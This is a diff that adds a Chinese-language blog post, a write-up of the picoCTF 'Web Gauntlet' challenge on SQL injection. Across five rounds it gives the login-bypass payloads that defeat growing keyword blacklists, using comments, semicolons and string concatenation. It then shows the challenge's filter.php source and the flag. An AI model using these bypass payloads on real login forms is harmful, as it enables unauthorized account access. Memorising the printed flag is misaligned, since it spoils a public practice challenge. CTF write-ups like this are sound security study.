@@ -1,0 +1,106 @@
+---
+title: 'Web Gauntlet'
+description: ''
+pubDate: '2026-05-06T11:00:00+08:00'
+tags: ['picoCTF', 'Web', 'SQL Injection']
+category: 'WriteUp'
+---
+
+- 分類：Web
+- 難度：Medium
+- 題目連結：https://play.picoctf.org/practice/challenge/88
+
+### 過程
+
+目的是 SQL Injection 以及繞過語句的黑名單
+
+1. 題目說 Log in as admin，所以要登入的 username 是 `admin`
+2. 第一題被擋的是 `or`
+```
+admin' --
+```
+```sql
+SELECT * FROM users WHERE username='admin' --' AND password='123'
+```
+3. 第二題被擋的是 `or` `and` `like` `=` `--`
+```
+admin' /*
+```
+```sql
+SELECT * FROM users WHERE username='admin' /*' AND password='123'
+```
+4. 第三題被擋的是 `or` `and` `=` `like` `>` `<` `--`，但有點不清楚為何 `/* ... */` 會被擋
+```
+admin';
+```
+```sql
+SELECT * FROM users WHERE username='admin';' AND password='123'
+```
+5. 第四題被擋的是 `or` `and` `=` `like` `>` `<` `--` `admin`，`admin` 被擋，那就用字串連接
+```
+ad'||'min';
+```
+```sql
+SELECT * FROM users WHERE username='ad'||'min';' AND password='123'
+```
+6. 第五題被擋的是 `or` `and` `=` `like` `>` `<` `--` `union` `admin`，`union` 被擋，那就跟上一個 payload 一樣
+```
+ad'||'min';
+```
+```sql
+SELECT * FROM users WHERE username='ad'||'min';' AND password='123'
+```
+7. 最後題目把 filter.php 過濾的檔案秀出來了
+
+```php showLineNumbers {47}
+<?php
+session_start();
+
+if (!isset($_SESSION["round"])) {
+    $_SESSION["round"] = 1;
+}
+$round = $_SESSION["round"];
+$filter = array("");
+$view = ($_SERVER["PHP_SELF"] == "/filter.php");
+
+if ($round === 1) {
+    $filter = array("or");
+    if ($view) {
+        echo "Round1: ".implode(" ", $filter)."<br/>";
+    }
+} else if ($round === 2) {
+    $filter = array("or", "and", "like", "=", "--");
+    if ($view) {
+        echo "Round2: ".implode(" ", $filter)."<br/>";
+    }
+} else if ($round === 3) {
+    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--");
+    // $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
+    if ($view) {
+        echo "Round3: ".implode(" ", $filter)."<br/>";
+    }
+} else if ($round === 4) {
+    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
+    // $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
+    if ($view) {
+        echo "Round4: ".implode(" ", $filter)."<br/>";
+    }
+} else if ($round === 5) {
+    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");
+    // $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
+    if ($view) {
+        echo "Round5: ".implode(" ", $filter)."<br/>";
+    }
+} else if ($round >= 6) {
+    if ($view) {
+        highlight_file("filter.php");
+    }
+} else {
+    $_SESSION["round"] = 1;
+}
+
+// picoCTF{y0u_m4d3_1t_79a0ddc6}
+?>
+```
+
+答案就爆出來了。
